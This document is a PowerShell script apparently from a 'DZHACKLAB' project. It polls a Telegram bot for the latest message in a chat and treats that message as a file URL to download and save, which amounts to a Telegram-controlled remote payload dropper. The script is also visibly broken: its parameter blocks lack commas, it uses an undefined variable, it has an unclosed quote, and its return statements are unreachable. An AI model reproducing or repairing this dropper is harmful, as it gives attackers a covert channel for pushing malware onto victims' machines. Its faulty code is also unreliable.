

function Log-Message
{
    [CmdletBinding()]
    Param
    (
        [Parameter(Mandatory=$true, Position=0)]
        [string]$LogMessage
    )

    Write-Output (" [DZHACKLAB] - ELMO9AWIM {0} - {1}" -f (Get-Date), $LogMessage)
}

Log-Message " [*] START JOB ------------------- ELMO9AWIM "




function Execute-HTTP-DOWNLOAD-GetCommand()
{
  [CmdletBinding()]
  Param
  (
        [Parameter(Mandatory=$true, Position=0)]
        [string]$FILE
        
        [Parameter(Mandatory=$true, Position=0)]
        [string]$SAVE
        
  )
  
  $webRequest = [System.Net.WebRequest]::Create($target)
  $webRequest.ServicePoint.Expect100Continue = $false
  $webRequest.Method = "Get"
  [System.Net.WebResponse]$resp = $webRequest.GetResponse()
  $rs = $resp.GetResponseStream()
  [System.IO.StreamReader]$sr = New-Object System.IO.StreamReader -argumentList $rs
  [string]$results = $sr.ReadToEnd()
  return $results
  
  return $result | Out-File -FilePath $SAVE
  
  
  
  (new-object System.Net.WebClient).DownloadFile( '$url, $path)

  
  
}

Function Get-File-TeleDrooper{
  Param(
  [Parameter(Mandatory=$true,Position=0)] [String[]]$BId
  [Parameter(Mandatory=$true,Position=0)] [String[]]$BToken

  )
  Write-Output "BOT ID: $BId || BOT TOKEN: $BToken"


  $MyToken = $BToken
  $ChatID = $BId
  $MyBotUpdates = Invoke-WebRequest -Uri "https://api.telegram.org/bot$($MyToken)/getUpdates"
  #Convert the result from json and put them in an array
  $jsonresult = [array]($MyBotUpdates | ConvertFrom-Json).result

  $LastMessage = ""
  Foreach ($Result in $jsonresult)  {
    If ($Result.message.chat.id -eq $ChatID)  {
      $LastMessage = $Result.message.text
    }
  }

  Log-Message " [*] START DOWNLOADING ------------------- ELMO9AWIM "

  Write-Host "RUN ME $($LastMessage)"

  $TELEFILE = $LastMessage

  Execute-HTTP-DOWNLOAD-GetCommand $TELEFILE $SAVE

  Log-Message " [*] END JOB ------------------- ELMO9AWIM "
  
  
  
}
